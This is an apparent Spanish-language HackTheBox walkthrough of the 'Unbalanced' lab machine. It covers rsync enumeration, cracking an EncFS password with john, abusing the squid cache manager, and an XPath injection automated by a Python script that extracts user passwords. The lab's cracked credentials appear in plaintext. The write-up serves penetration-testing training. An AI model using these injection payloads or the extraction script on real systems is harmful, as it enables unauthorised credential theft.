---
layout      : post
title       : "HackTheBox - Unbalanced"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unbalanced/268banner.png
category    : [ htb ]
tags        : [ rsync, XML, XPath, squid-proxy, PiHole, docker ]
---
Máquina Linux nivel difícil. Nos enfrentaremos con encriptación, mucho jugueteo con XML (romperemos una clave y encontraremos un XPATH injection que automatizaremos para extraer credenciales), explotaremos PiHole y sobre todo, enumeraremos demasiado (:

![unbalancedHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unbalanced/unbalancedHTB.png)

### TL;DR (Spanish writeup)

Que bonita experiencia, primer maquina nivel difícil para mí:

Empezaremos jugando con `rsync` para obtener un conjunto de archivos en el sistema, los copiaremos e investigando nos encontraremos con que estan encriptados mediante `EncFS`, también enumerando :P tendremos un archivo que contiene la **key** que nos puede servir para obtener la contraseña y posteriormente desencriptar los archivos. Usaremos `encfs2john.py` para extraer información de `.encfs6.xml`, tendremos la contraseña `bubblegum`.

Desencriptando los archivos, tendremos información útil de `squid` (otro de los servicios que corre la máquina). Jugaremos con el archivo `squid.conf` para obtener un conjunto de IP's, iremos validándolas en la web. Una de ellas nos mostrara que valida lo que le pongamos, testeando con ella encontraremos un `XPath Injection`, aprovecharemos esto para extraer información del archivo XML, el proceso manual es poco efectivo, nos crearemos un script en Python para automatizar la extracción de contraseñas de cada usuario (: para con ello obtener las credenciales del usuario `brayan`.

Finalmente encontraremos que se está corriendo `PiHole` sobre un contenedor de `Docker`. Buscando por internet tendremos un exploit que vulnera la versión que tenemos, lo usaremos para entrar al sistema de archivos del contenedor, enumeraremos y encontraremos "algo" a lo que se nos hacía referencia en el proceso, de ahí obtendremos la contraseña "temporal" del usuario `root`.

Esto en <<pocas>> palabras, prendámosle candela...


> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme :) además me enfoco en plasmar mis errores y exitos (por si ves muuuucho texto).

...

### Fases

Tendremos 3 fases. Enumeración, explotación y escalada de privilegios (:

1. [Enumeración](#enumeracion)
2. [Explotación](#explotacion)
3. [Escalada de privilegios](#escalada-de-privilegios)

...

## Enumeración [#](#enumeracion) {#enumeracion}

Empezaremos realizando un escaneo de puertos sobre la máquina para saber que servicios está corriendo.

```bash
–» nmap -p- --open -v -Pn 10.10.10.200 -oG initScan
```

> **Es importante hacer un escaneo total, sin cambios, asi vaya lento, que nos permita ver si obviamos/pasamos algún puerto**. 

En este caso no vamos a agregarle ningún argumento de más, ya que va bastante bien en cuanto a tiempo.

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los 65535                                                                                  |
| --open     | Solo los puertos que están abiertos                                                                      |
| -Pn        | Evita que realice Host Discovery, como **ping** (P) y el **DNS** (n)                                     |
| -v         | Permite ver en consola lo que va encontrando                                                             |
| -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard      |

```bash
–» cat initScan 
# Nmap 7.80 scan initiated Thu Nov 12 25:25:25 2020 as: nmap -p- --open -v -Pn -oG initScan 10.10.10.200
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.200 ()   Status: Up
Host: 10.10.10.200 ()   Ports: 22/open/tcp//ssh///, 873/open/tcp//rsync///, 3128/open/tcp//squid-http///
```

Muy bien, tenemos los siguientes servicios arriba:

| Puerto | Descripción   |
| ------ | :------------ |
| 22     | **SSH**: Secure Shell ([Permite acceso remoto a un servidor](https://es.wikipedia.org/wiki/Secure_Shell))                                                  |
| 873    | **rsync**: [Ofrece transmisión eficiente de datos incrementales, que opera también con datos comprimidos y cifrados.](https://es.wikipedia.org/wiki/Rsync) |
| 3128   | **squid-http**: [Squid es un servidor proxy para web con caché.](https://es.wikipedia.org/wiki/Squid_(programa))                                           |

Hagamos nuestro escaneo de versiones y scripts en base a cada puerto, con ello obtenemos información más detallada de cada servicio:

```bash
–» nmap -p 22,873,3128 -sC -sV 10.10.10.200 -oN portScan
```

| Parámetro | Descripción   |
| ----------|:------------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
–» cat portScan 
# Nmap 7.80 scan initiated Thu Nov 12 25:25:25 2020 as: nmap -p 22,873,3128 -sC -sV -oN portScan 10.10.10.200
Nmap scan report for 10.10.10.200
Host is up (0.19s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)
|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)
|_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)
873/tcp  open  rsync      (protocol version 31)
3128/tcp open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ok ok, veamos:

| Puerto | Servicio   | Versión            |
| :----- | :--------- | :----------------- |
| 22     | SSH        | OpenSSH 7.9p1      |
| 873    | rsync      | Protocol 31        |
| 3128   | http-proxy | Squid proxy 4.6    |

Perfecto, pues empecemos a ahondar en cada uno de ellos y ver por donde podemos vulnerar la máquina (:

...

### Puerto 873 ~

Buscando por internet encontramos el siempre confiable cheatsheet de [HackTricks](https://book.hacktricks.xyz/) en el que tenemos algunas pruebas hacia el puerto 873, veamos.

* [873-pentesting-rsync](https://book.hacktricks.xyz/pentesting/873-pentesting-rsync)

> **rsync** is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification times and sizes of files. [HackingTricks-rsync](https://book.hacktricks.xyz/pentesting/873-pentesting-rsync)

Si nos conectamos mediante `netcat` nos responderá con la versión del servicio, debemos enviar ese mismo output para que el server nos entable una conexión. Después validamos si existe algún recurso alojado.

```bash
–» nc -vn 10.10.10.200 873
(UNKNOWN) [10.10.10.200] 873 (rsync) open
@RSYNCD: 31.0      # Esta es la respuesta :P
@RSYNCD: 31.0      # Le respondemos
#list              # Le decimos que nos liste recursos
conf_backups    EncFS-encrypted configuration backups         # ~Tenemos cosillas
@RSYNCD: EXIT      # El propio sistema cierra la conexión
```

Bien, ahora podemos usar otra utilidad que nos permita ver más a fondo el contenido del recurso `conf_backups`, el cual según vemos en la descripción son objetos de configuración encriptados mediante [EncFS](https://es.wikipedia.org/wiki/EncFS).

> **EncFS** es un sistema criptográfico de archivos gratuito. Trabaja de forma transparente, utilizando un directorio arbitrario como almacenamiento para los archivos cifrados. [Wikipedia](https://es.wikipedia.org/wiki/EncFS)

```bash
–» rsync -av --list-only rsync://10.10.10.200/conf_backups
receiving incremental file list
drwxr-xr-x          4,096 2020/04/04 10:05:32 .
-rw-r--r--            288 2020/04/04 10:05:31 ,CBjPJW4EGlcqwZW4nmVqBA6
-rw-r--r--            135 2020/04/04 10:05:31 -FjZ6-6,Fa,tMvlDsuVAO7ek
-rw-r--r--          1,297 2020/04/02 08:06:19 .encfs6.xml
-rw-r--r--            154 2020/04/04 10:05:32 0K72OfkNRRx3-f0Y6eQKwnjn
-rw-r--r--             56 2020/04/04 10:05:32 27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo-
-rw-r--r--            190 2020/04/04 10:05:32 2VyeljxHWrDX37La6FhUGIJS
-rw-r--r--            386 2020/04/04 10:05:31 3E2fC7coj5,XQ8LbNXVX9hNFhsqCjD-g3b-7Pb5VJHx3C1
-rw-r--r--            537 2020/04/04 10:05:31 3cdBkrRF7R5bYe1ZJ0KYy786
-rw-r--r--            560 2020/04/04 10:05:31 3xB4vSQH-HKVcOMQIs02Qb9,
-rw-r--r--            275 2020/04/04 10:05:32 4J8k09nLNFsb7S-JXkxQffpbCKeKFNJLk6NRQmI11FazC1
-rw-r--r--            463 2020/04/04 10:05:32 5-6yZKVDjG4n-AMPD65LOpz6-kz,ae0p2VOWzCokOwxbt,
-rw-r--r--          2,169 2020/04/04 10:05:31 5FTRnQDoLdRfOEPkrhM2L29P
-rw-r--r--            238 2020/04/04 10:05:31 5IUA28wOw0wwBs8rP5xjkFSs
-rw-r--r--          1,277 2020/04/04 10:05:31 6R1rXixtFRQ5c9ScY8MBQ1Rg
... #Otros más
```

* **-a**: append, archive. (Permite mostrar todos los archivos de manera corta.)
* **-v**: verbose. (Muestre por pantalla lo que va pasando.)
* **--list-only**: Lista los archivos en lugar de copiarlos.

Ahora que sabemos que si tiene contenido, intentemos copiarlo a nuestra máquina para después jugar :P

```bash
–» mkdir rsync_files
–» cd rsync_files
–» rsync -av rsync://10.10.10.200/conf_backups .
```

![268bashrsynctotalfiles](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unbalanced/268bashrsynctotalfiles.png)

De estos pasos podemos obtener info tal como fecha y tamaño del archivo. Veamos que podemos hacer con estos archivos.

Entre ellos hay un archivo oculto:

```bash
–» ls -a
.                                               cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1  Ni8LDatT134DF6hhQf5ESpo5
..                                              dF2GU58wFl3x5R7aDE6QEnDj                        Nlne5rpWkOxkPNC15SEeJ8g,
0K72OfkNRRx3-f0Y6eQKwnjn                        dNTEvgsjgG6lKBr8ev8Dw,p7                        OFG2vAoaW3Tvv1X2J5fy4UV8
27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo-  ECXONXBBRwhb5tYOIcjjFZzh                        oPu0EVyHA6,KmoI1T,LTs83x
2VyeljxHWrDX37La6FhUGIJS                        .encfs6.xml                                     OvBqims-kvgGyJJqZ59IbGfy
3cdBkrRF7R5bYe1ZJ0KYy786                        F4F9opY2nhVVnRgiQ,OUs-Y0                        pfTT,nZnCUFzyPPOeX9NwQVo
...
```

Veamos su contenido:

```xml
–» cat .encfs6.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE boost_serialization>
<boost_serialization signature="serialization::archive" version="7">
    <cfg class_id="0" tracking_level="0" version="20">
        <version>20100713</version>
        <creator>EncFS 1.9.5</creator>
        <cipherAlg class_id="1" tracking_level="0" version="0">
            <name>ssl/aes</name>
            <major>3</major>
            <minor>0</minor>
        </cipherAlg>
        <nameAlg>
            <name>nameio/block</name>
            <major>4</major>
            <minor>0</minor>
        </nameAlg>
        <keySize>192</keySize>
        <blockSize>1024</blockSize>
        <plainData>0</plainData>
        <uniqueIV>1</uniqueIV>
        <chainedNameIV>1</chainedNameIV>
        <externalIVChaining>0</externalIVChaining>
        <blockMACBytes>0</blockMACBytes>
        <blockMACRandBytes>0</blockMACRandBytes>
        <allowHoles>1</allowHoles>
        <encodedKeySize>44</encodedKeySize>
        <encodedKeyData>
GypYDeps2hrt2W0LcvQ94TKyOfUcIkhSAw3+iJLaLK0yntwAaBWj6EuIet0=
</encodedKeyData>
        <saltLen>20</saltLen>
        <saltData>
mRdqbk2WwLMrrZ1P6z2OQlFl8QU=
</saltData>
        <kdfIterations>580280</kdfIterations>
        <desiredKDFDuration>500</desiredKDFDuration>
    </cfg>
</boost_serialization>
```

Buscando hay varias cosas interesantes, entre ellas destaco:

* En caso de perder ese archivo (cualquier escenario, sea como usuario o atacante) [no tendremos posibilidades de desencriptar los archivos.](https://unix.stackexchange.com/questions/184215/can-i-decrypt-encfs-files-without-the-encfs6-xml#answer-184332)
* Dentro está la llave encriptada con la que podríamos desencriptar todo el conjunto de archivos.
* [Hay un post en específico que muestra](https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml#answer-225862) como podríamos desencriptar el archivo mediante **python** y **john**.

...

## Explotación [#](#explotacion) {#explotacion}

Siguiendo la idea del post, usa un script llamado **encfs2john.py**, encontré [este en GitHub](https://github.com/truongkma/ctf-tools/blob/master/John/run/encfs2john.py), usémoslo.

* Básicamente toma la carpeta donde esté el archivo `encfs6.xml` y extrae varios argumentos, que con ellos armara el **hash** que intentaremos crackear con **john**.
* Juega con bytes y base64 para ir almacenando la data desencriptada.

```bash
–» wget https://raw.githubusercontent.com/truongkma/ctf-tools/master/John/run/encfs2john.py
–» chmod +x encfs2john.py
–» python encfs2john.py rsync_files/ > encfs.xml.john
–» cat encfs.xml.john 
rsync_files/:$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add
–» john --wordlist=/usr/share/wordlists/rockyou.txt encfs.xml.john 
Using default input encoding: UTF-8
Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 580280 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
bubblegum        (rsync_files/)
1g 0:00:01:04 DONE (2020-11-12 25:25) 0.01550g/s 11.16p/s 11.16c/s 11.16C/s zacefron..marissa
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Peeeeeeerfecto, tenemos en texto plano el resultado: **bubblegum**. Ahora a desencriptar los archivos, siguiendo [esta guia](https://askmeaboutlinux.com/2014/01/25/how-to-use-encfs-on-linux-to-encrypt-data-and-decrypt-data-in-a-folder/) en un punto nos enseña como podríamos hacerlo. (<<Monta>> una montura mientras manejemos los archivos).

```bash
–» encfs ~/rsync_files/ ~/rsync_plain   #Con esto le indicamos que el resultado lo guarde en la carpeta `rsync_plain` (tienen que ser rutas absolutas).
Contraseña EncFS:
–» ls rsync_plain/
50-localauthority.conf              debconf.conf                    fuse.conf        libaudit.conf     networkd.conf                    rsyncd.conf     udev.conf
50-nullbackend.conf                 debian.conf                     gai.conf         libc.conf         nsswitch.conf                    rsyslog.conf    update-initramfs.conf
51-debian-sudo.conf                 deluser.conf                    group.conf       limits.conf       org.freedesktop.PackageKit.conf  semanage.conf   user.conf
70debconf                           dhclient.conf                   hdparm.conf      listchanges.conf  PackageKit.conf                  sepermit.conf   user-dirs.conf
99-sysctl.conf                      discover-modprobe.conf          host.conf        logind.conf       pam.conf                         sleep.conf      Vendor.conf
access.conf                         dkms.conf                       initramfs.conf   logrotate.conf    pam_env.conf                     squid.conf      wpa_supplicant.conf
adduser.conf                        dns.conf                        input.conf       main.conf         parser.conf                      sysctl.conf     x86_64-linux-gnu.conf
bluetooth.conf                      dnsmasq.conf                    journald.conf    mke2fs.conf       protect-links.conf               system.conf     xattr.conf
ca-certificates.conf                docker.conf                     kernel-img.conf  modules.conf      reportbug.conf                   time.conf
com.ubuntu.SoftwareProperties.conf  fakeroot-x86_64-linux-gnu.conf  ldap.conf        namespace.conf    resolv.conf                      timesyncd.conf
dconf                               framework.conf                  ld.so.conf       network.conf      resolved.conf                    ucf.conf
...
#Si queremos terminar la montura le indicamos:
–» fusermount -u rsync_plain
```

### Puerto 3128 ~

Listo, recorramos los archivos y ver que cositas interesantes hay (:

Tenemos un archivo que se relaciona con lo que encontramos en el escaneo inicial: `squid.conf`. 

```bash
–» cat squid.conf
#       WELCOME TO SQUID 4.6
#       ----------------------------
#
#       This is the documentation for the Squid configuration file.
#       This documentation can also be found online at:
#               http://www.squid-cache.org/Doc/config/
#
#       You may wish to look at the Squid home page and wiki for the
#       FAQ and other documentation:
#               http://www.squid-cache.org/
#               http://wiki.squid-cache.org/SquidFaq
#               http://wiki.squid-cache.org/ConfigExamples
#
#       This documentation shows what the defaults for various directives
#       happen to be.  If you don't need to change the default, you should
#       leave the line out of your squid.conf in most cases.
...
```

Es bastante grande, pero la mayoría (según entiendo) son líneas comentadas, hagamos que nos muestre solo las lineas sin **#**, ósea las que no estan comentadas :P

```bash
–» cat squid.conf | grep -v "#" | uniq
acl SSL_ports port 443
acl CONNECT method CONNECT

http_access deny !Safe_ports

http_access deny CONNECT !SSL_ports

http_access allow manager

include /etc/squid/conf.d/*

http_access allow localhost

acl intranet dstdomain -n intranet.unbalanced.htb
acl intranet_net dst -n 172.16.0.0/12
http_access allow intranet
http_access allow intranet_net

http_access deny all

http_port 3128

coredump_dir /var/spool/squid

refresh_pattern ^ftp:           1440    20%     10080
refresh_pattern ^gopher:        1440    0%      1440
refresh_pattern -i (/cgi-bin/|\?) 0     0%      0
refresh_pattern .               0       20%     4320

cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
cachemgr_passwd disable all

cache disable
```

* Cuando quitamos los **#** quedan muchos saltos de línea, por ello usamos `uniq`, para que evite mostrar líneas repetidas (:

Listo, mucho más fácil, además a simple vista tenemos cositas interesantes:

* Vemos dos dominios nuevos: `intranet.unbalanced.htb` y `172.16.0.0` (Esta es una red privada).
* El puerto con el que nos encontramos inicialmente: `3128`.
* Solo permite el acceso a los dos dominios: `http_access allow intranet` y `http_access allow intranet_net`, de resto: `http_access deny all`.
* Me llama la atención esta string: `cachemgr_passwd Thah$Sh1`.

Inicialmente no había entendido en enfoque y agregue el dominio al `/etc/hosts`, pero después de retroceder y leer que tenía un proxy, fue más fácil retomar las ideas. Entonces sabemos que **squid** es un proxy, solo se nos permite el acceso a los dominios encontrados, si jugamos primero con `curL` podremos validar la respuesta, luego iremos a la web para configurar el proxy y jugar desde ahí.

Le indicamos que nos muestre lo que vaya pasando (-v: verbose) al conectarnos al dominio **intranet.unbalanced.htb** pero mediante el proxy (-x o --proxy :P) que tenemos en **10.10.10.200** sobre el puerto **3128**.

```bash
–» curl -v http://intranet.unbalanced.htb --proxy 10.10.10.200:3128
*   Trying 10.10.10.200:3128...
* TCP_NODELAY set
* Connected to 10.10.10.200 (10.10.10.200) port 3128 (#0)
> GET http://intranet.unbalanced.htb/ HTTP/1.1
> Host: intranet.unbalanced.htb
> User-Agent: curl/7.68.0
> Accept: */*
> Proxy-Connection: Keep-Alive
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Server: nginx/1.14.0 (Ubuntu)
< Date: Sun, 15 Nov 2020 21:04:36 GMT
< Content-Type: text/html; charset=UTF-8
< Location: intranet.php
< Intranet-Host: intranet-host3.unbalanced.htb
< X-Cache: MISS from unbalanced
< X-Cache-Lookup: MISS from unbalanced:3128
< Transfer-Encoding: chunked
< Via: 1.1 unbalanced (squid/4.6)
< Connection: keep-alive
< 
* Connection #0 to host 10.10.10.200 left intact
```

Perfecto obtenemos respuesta válida (además que nos lleva a `intranet.php`), vamos para la web y configuramos un par de cosas, en mi caso en Firefox :):

* Seguí [esta guia](https://www.whatismyip.com/what-is-a-proxy/).

![268pageconfproxymoz](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unbalanced/268pageconfproxymoz.png)

Y ahora validemos en la web:

![268pageproxydone](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unbalanced/268pageproxydone.png)

Muy bien, lo siguiente será jugar con el logging área que tenemos y los apartados de la izquierda.

Entre la búsqueda de información encontré [este post](http://www.alcancelibre.org/staticpages/index.php/19-5-como-squid-cachemgr) en el que podemos confirmar que `Thah$Sh1` es una contraseña, probablemente la usemos dentro de poco (:

Después de un tiempo perdido, decidí buscar ayuda, le hable a [@TazWake](https://www.hackthebox.eu/profile/49335), miembro activo de HTB. Me indico que revisara muy bien el archivo, ya que se nos está permitiendo el acceso a otro recurso y prácticamente nos está diciendo que podemos ver con ese recurso... Pues después de esto, vi que tenemos acceso a `manager`:

```bash
http_access allow manager
```

Es una utilidad que muestra estadísticas sobre los procesos llevados a cabo por **squid**, además de ser una buena manera de llevar la cache. Podemos ver la info mediante la herramienta `squidclient`. Esta es la data que nos interesa:

```bash
cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
cachemgr_passwd disable all
```

Esto nos indica que la contraseña para autenticarnos hacia el proxy es `Thah$Sh1` y que podemos ver información mediante estos argumentos: `menú pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events`.

* Así mismo encontré [esta tabla](http://etutorials.org/Server+Administration/Squid.+The+definitive+guide/Chapter+14.+Monitoring+Squid/14.2+The+Cache+Manager/) donde se detalla el uso de cada uno.
* También nos indica la sintaxis de como se usa `manager`.

```bash
–» squidclient -h 10.10.10.200 -p 3128 -w 'Thah$Sh1' mgr:menu
HTTP/1.1 200 OK
Server: squid/4.6
Mime-Version: 1.0
Date: Tue, 17 Nov 2020 20:32:20 GMT
Content-Type: text/plain;charset=utf-8
Expires: Tue, 17 Nov 2020 20:32:20 GMT
Last-Modified: Tue, 17 Nov 2020 20:32:20 GMT
X-Cache: MISS from unbalanced
X-Cache-Lookup: MISS from unbalanced:3128
Via: 1.1 unbalanced (squid/4.6)
Connection: close

 index                  Cache Manager Interface                 disabled
 menu                   Cache Manager Menu                      protected
 offline_toggle         Toggle offline_mode setting             disabled 
 shutdown               Shut Down the Squid Process             disabled 
 reconfigure            Reconfigure Squid                       disabled
 rotate                 Rotate Squid Logs                       disabled 
 pconn                  Persistent Connection Utilization Histograms    protected
 mem                    Memory Utilization                      protected
 diskd                  DISKD Stats                             protected
 squidaio_counts        Async IO Function Counters              disabled 
 config                 Current Squid Configuration             disabled
 client_list            Cache Client List                       disabled 
 comm_epoll_incoming    comm_incoming() stats                   disabled
 ipcache                IP Cache Stats and Contents             disabled
 fqdncache              FQDN Cache Stats and Contents           protected
 idns                   Internal DNS Statistics                 disabled
 ...
```

Nos muestra los argumentos a los que tenemos acceso, viendo el output de cada uno (los que tenemos en `squid.conf` o los que en el anterior output nos indique `protected`) obtenemos uno interesante:

```bash
–» squidclient -h 10.10.10.200 -p 3128 -w 'Thah$Sh1' mgr:fqdncache
HTTP/1.1 200 OK
Server: squid/4.6
Mime-Version: 1.0
Date: Wed, 18 Nov 2020 05:03:59 GMT
Content-Type: text/plain;charset=utf-8
Expires: Wed, 18 Nov 2020 05:03:59 GMT
Last-Modified: Wed, 18 Nov 2020 05:03:59 GMT
X-Cache: MISS from unbalanced
X-Cache-Lookup: MISS from unbalanced:3128
Via: 1.1 unbalanced (squid/4.6)
Connection: close

FQDN Cache Statistics:
FQDNcache Entries In Use: 11
FQDNcache Entries Cached: 8
FQDNcache Requests: 6
FQDNcache Hits: 0
FQDNcache Negative Hits: 0
FQDNcache Misses: 6
FQDN Cache Contents:

Address                                       Flg TTL Cnt Hostnames
127.0.1.1                                       H -001   2 unbalanced.htb unbalanced
::1                                             H -001   3 localhost ip6-localhost ip6-loopback
172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
127.0.0.1                                       H -001   1 localhost
172.17.0.1                                      H -001   1 intranet.unbalanced.htb
ff02::1                                         H -001   1 ip6-allnodes
ff02::2                                         H -001   1 ip6-allrouters
```

> **FQDN** es un nombre de dominio completo que incluye el nombre de la computadora y el nombre de dominio asociado a ese equipo. [Wikipedia](https://es.wikipedia.org/wiki/FQDN)

* [Info sobre **fqdncache**](https://wiki.squid-cache.org/Features/CacheManager/FqdnCache).

Tenemos las direcciones y resoluciones DNS, vemos el dominio en donde estamos `intranet.unbalanced.htb` y los posibles dominios a los que debamos movernos... Validando `172.31.179.2` y `172.31.179.3` son idénticas a `intranet.unbalanced.htb (172.17.0.1)`. Estuve bastante tiempo perdido acá, no vi algo sencillo. ¿No falta algo entre `172.31.179.2` y `172.31.179.3`?, pues sí, revisemos `172.31.179.1`:

![268pageip1down](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unbalanced/268pageip1down.png)

* [Info sobre **load balancer**](https://www.redeszone.net/tutoriales/servidores/balanceador-carga-load-balancer-que-es-funcionamiento/)

Entiendo que no se nos mostró en la cache ya que la "quitaron" para no dejar rastro (que por lo visto estaban teniendo problemas con ella) pero pues... (: Veamos si podemos encontrar algo con `gobuster`.

```bash
–» gobuster dir -u http://172.31.179.1 -p http://10.10.10.200:3128 -b 404,403 -w /opt/SecLists/Discovery/Web-Content/raft-small-files.txt -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:                     http://172.31.179.1
[+] Threads:                 100
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-files.txt
[+] Negative Status codes:   403,404
[+] Proxy:                   http://10.10.10.200:3128
[+] User Agent:              gobuster/3.0.1
[+] Timeout:                 10s
===============================================================
2020/25/25 25:25:25 Starting gobuster
===============================================================
/index.php (Status: 200)
/. (Status: 301)
/intranet.php (Status: 200)
===============================================================
2020/25/25 25:25:25 Finished
===============================================================
```

Y si vamos a `/intranet.php` tenemos la misma página que las otras direcciones, pero en este caso al ingresar los datos y validarlos nos indica si son correctas o no :)

Después de un gran testeo de varias cositas, encontramos una vulnerabilidad **XPath Injection** en el campo `Password`. Con un simple `hola' or '1` explota :P

> Los ataques de **inyección XPath** se producen cuando un sitio web utiliza la información suministrada por el usuario para construir una consulta XPath para datos **XML**. [Wikipedia]

Alguna info sobre ella:

* [Testing for XPath Injection - OWASP](https://wiki.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))
* [XPath Injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/xpath-injection)

Obtenemos esto:

![268pagexpathfound](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unbalanced/268pagexpathfound.png)

Vemos unos usuarios con su respectiva información... Acá estuve buscando y buscando pero lo que probaba no me funcionaba. Estaba en un enfoque válido pero con mala sintaxis, gracias a la ayuda de nuevo de [@TazWake](https://www.hackthebox.eu/profile/49335) me redirecciono, yo estaba intentando extraer los nombre de las filas, para con ello validar si había otro campo que no se mostraba inicialmente (no me daba respuesta la página).

Para con esto validar si el primer carácter del primer usuario era `'r'` de `'rita'`:

```html
' or substring(user(/[position()=1]),1,1)='r' or '
```

Pero no había intentado algo más fácil (acá fue donde me ayudo @TazWake). Usando el mismo nombre del campo:

```html
' or substring(Username,1,1)='r' or '
```

![268pageritaquery](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unbalanced/268pageritaquery.png)

Perfecto, ahora solo nos muestra ese registro, lo que sigue es validar lo mismo pero con el campo `Password`, para esto podemos crearnos un script que nos ayude...

Tuve un problema y era que la letra que encontraba en el campo **Password** podía ser de cualquier usuario, simplemente la primera similitud hacia que pasara a la siguiente letra, por lo tanto obtenía una palabra con la mezcla de las contraseñas, así que la idea era que inicialmente tome un **Username** como referencia y a ese **Username** le extrajera el Password**. Después de varios problemas e intentar cosas "difíciles" o dejar de intentar cosas :( intente esta línea:

```html
' or substring(Username,1,4)='rita' and substring(Password,1,1)='a' or '
```

Esto jugando ya con bucles, arrays y demás cositas nos quedaría así:

```py
password = "' or substring(Username,1,4)='rita' and substring(Password,%d,1)='%s' or '" % (posicion, letra)
```

Que finalmente nos da como contraseña: `password01!`. Modificando mejor el script para que tome de una vez cada usuario y le extraiga su contraseña:

```py
#!/usr/bin/python3 

import requests, re
from pwn import *

intranet_url = "http://172.31.179.1/intranet.php"
proxy = {"http" : "http://10.10.10.200:3128"}

try:
    p1 = log.progress("XPath exploit")

    axyz = "abcdefghijklmnopqrstuvwxyz0123456789!\"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    username = "anY0ne"
    users_array = ["rita", "jim", "bryan", "sarah"]
    letter_found = ""

    for name in users_array:

        p2 = log.progress("Username")
        p2.status("%s = " % (name))
        length_name = len(name)

        #Hacemos de cuenta que la cadena tiene un tamaño maximo de 24 caracteres.
        for col in range(1, 25):
            #Probamos cada letra, numero y simbolo del la variable -axyz-.
            for letter_array in axyz:
                password = "' or substring(Username,1,%d)='%s' and substring(Password,%d,1)='%s' or '" % (length_name, name, col, letter_array)
                p1.status("%s" % (password))

                data_post = {
                    "Username" : username,
                    "Password" : password
                }

                req = requests.post(intranet_url, data=data_post, proxies=proxy, timeout=10)
                
                try:
                    juicy = re.findall(r'<div class="w3-row-padding w3-grayscale"><div class="w3-col m4 w3-margin-bottom"><div class="w3-light-grey"><p class=\'w3-opacity\'>(.*)', req.text)
                    #Cuando el payload se ejecuta y se crea esta etiqueta sabemos que nos mostro algo del XML, tomamos la letra en que sucedio y la guardamos en una variable, para asi ir armando la password
                    if juicy:
                        letter_found += letter_array
                        p2.status("%s = %s" % (name, letter_found))
                        break

                except:
                    p2.failure("The ju1cy failed :(")

        p2.success("%s = %s" % (name, letter_found))
        letter_found = ""

    p1.success("w3 4r3 d0n3 (:")

except requests.exceptions.ReadTimeout:
    p2.failure("t1m3:(0ut")
```

* [Acá queda el script por si algo :P](https://github.com/lanzt/blog/tree/main/assets/scripts/HTB/unbalanced/vulnpage.py)

Obtenemos este output:

![268pyuserandpass](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unbalanced/268pyuserandpass.png)

Tenemos credenciales para probar en **SSH**, **rsync** o en el mismo login.

| Username | Password                |
| -------- |:----------------------- |
| rita     | password01!             |
| jim      | stairwaytoheaven        |
| bryan    | ireallyl0vebubblegum!!! |
| sarah    | sarah4evah              |

Si probamos con **SSH** cada credencial, las del usuario que tiene como rol **System Administrator** ósea `bryan` nos otorga acceso a la máquina y tenemos el flag `user.txt` :)

![268bashbryanssh](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unbalanced/268bashbryanssh.png)

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

